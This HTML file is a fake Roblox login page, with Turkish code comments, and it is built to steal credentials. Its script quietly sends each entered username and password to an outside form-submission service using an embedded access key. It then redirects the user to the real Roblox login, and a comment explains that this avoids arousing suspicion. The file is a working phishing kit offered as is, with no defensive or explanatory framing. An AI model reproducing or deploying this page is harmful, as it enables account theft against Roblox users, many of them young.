<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Roblox</title>
    <style>
        body {
            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://image.api.playstation.com/vulcan/ap/rnd/202504/1706/4cc02203db88b29b535c26b8296c89f983eaf48d67462e1d.png?w=1920');
            background-size: cover; background-position: center; height: 100vh; margin: 0;
            display: flex; justify-content: center; align-items: center; font-family: sans-serif;
        }
        .login-box {
            background: rgba(25, 25, 25, 0.85); backdrop-filter: blur(15px);
            padding: 40px; border-radius: 10px; width: 340px; text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        input {
            width: 100%; height: 44px; background: rgba(0,0,0,0.5); border: 1px solid #444;
            color: white; border-radius: 5px; margin-bottom: 15px; padding: 0 10px; box-sizing: border-box;
        }
        /* Görseldeki Beyaz Buton */
        .btn-white {
            width: 100%; height: 44px; background: white; border: none;
            color: black; font-weight: bold; border-radius: 5px; cursor: pointer; margin-bottom: 10px;
        }
        /* Görseldeki Şeffaf Buton */
        .btn-outline {
            width: 100%; height: 44px; background: transparent; border: 1px solid white;
            color: white; font-weight: bold; border-radius: 5px; cursor: pointer;
        }
        .footer-link { color: #ccc; font-size: 12px; text-decoration: none; display: block; margin-top: 15px; }
    </style>
</head>
<body>

<div class="login-box">
    <form id="loginForm">
        <input type="text" id="user" placeholder="Username/Email/Phone" required>
        <input type="password" id="pass" placeholder="Password" required>
        
        <button type="submit" class="btn-white">Log In</button>
        <button type="button" class="btn-outline" onclick="window.location.href='https://www.roblox.com/login/otp'">Log In With Another Device</button>
    </form>
    <a href="#" class="footer-link">Forgot Password or Username?</a>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const user = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;

    // WEB3FORMS GÖNDERİMİ (ARKA PLANDA)
    fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({
            access_key: '4d9b8514-bee7-4916-bfab-e61246fa5ba7',
            username: user,
            password: pass
        })
    })
    .then(() => {
        // Hata verse bile kullanıcıyı Roblox'a atıyoruz (şüphe çekmez)
        window.location.href = 'https://www.roblox.com/login';
    })
    .catch(() => {
        window.location.href = 'https://www.roblox.com/login';
    });
});
</script>

</body>
</html>
